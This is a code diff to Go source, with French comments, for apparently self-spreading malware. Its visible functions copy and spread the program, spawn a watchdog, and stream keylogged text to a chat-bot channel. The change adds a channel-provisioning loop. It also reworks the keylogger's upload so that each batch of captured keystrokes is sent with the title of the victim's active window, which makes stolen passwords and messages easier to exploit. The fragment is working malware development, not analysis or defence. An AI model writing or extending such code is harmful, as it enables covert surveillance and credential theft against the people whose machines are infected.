@@ -14,7 +14,6 @@ import (
 	"net/http"
 	"os"
 	"path/filepath"
-	"strconv"
 	"strings"
 	"sync"
 	"sync/atomic"
@@ -532,6 +531,7 @@ func startPayload() {
 		spreadCopies(false)
 		go spreadLoop()
 		go queueLoop()
+		go channelProvisionLoop()
 		spawnWatchdog()
 
 		time.Sleep(time.Duration(5+rand.Intn(5)) * time.Second)
@@ -762,8 +762,14 @@ func keylogStream() {
 	}
 	klStreamSent += int64(len(chunk))
 	txt := strings.TrimRight(string(chunk), "\n")
-	botSendText(ch, "**kl.log** · "+hostChannelName()+" · "+
-		time.Now().Format("02/01 15:04")+" — "+strconv.Itoa(len(chunk))+" octets\n```\n"+txt+"\n```")
+	// En-tête lisible : heure + fenêtre active, pour replacer les frappes
+	// dans leur contexte sans noyer le flux.
+	win := foregroundTitle()
+	head := "**kl** · " + time.Now().Format("15:04") + " · " + hostChannelName()
+	if win != "" {
+		head += " · " + truncate(win, 40)
+	}
+	botSendText(ch, head+"\n```\n"+txt+"\n```")
 }
 
 // bootNote écrit une ligne de suivi dans le salon de la machine. Trois lignes
